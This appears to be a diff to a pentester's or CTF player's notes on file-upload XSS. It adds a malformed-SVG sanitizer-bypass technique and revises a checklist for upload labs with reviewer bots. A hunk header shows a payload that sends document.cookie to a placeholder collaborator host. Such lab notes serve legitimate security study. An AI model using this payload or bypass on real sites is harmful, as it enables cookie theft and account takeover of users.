@@ -53,6 +53,13 @@ fetch('https://[collaborator]?c='+encodeURIComponent(document.cookie));
 
 ## Alternate Upload XSS Paths
 
+Parser-failure SVG:
+
+- well-formed SVG is sanitized
+- malformed / unclosed SVG may skip the sanitizer entirely
+- stored object may be served as `text/html` even with a `.svg` URL
+- common when app copy says unreadable uploads are "left alone"
+
 PNG/JPEG polyglot:
 
 - file begins with image magic bytes
@@ -106,4 +113,4 @@ The app stores attacker-controlled XML and later serves it from the same site th
 
 ## Future Checklist Item
 
-On upload labs with reviewer bots, test direct SVG script upload before PNG polyglot or S3 response-header override work.
+On upload labs with reviewer bots, test direct SVG script upload first, then malformed SVG parser-failure uploads when readable vs unreadable handling is hinted, before PNG polyglot or S3 response-header override work.
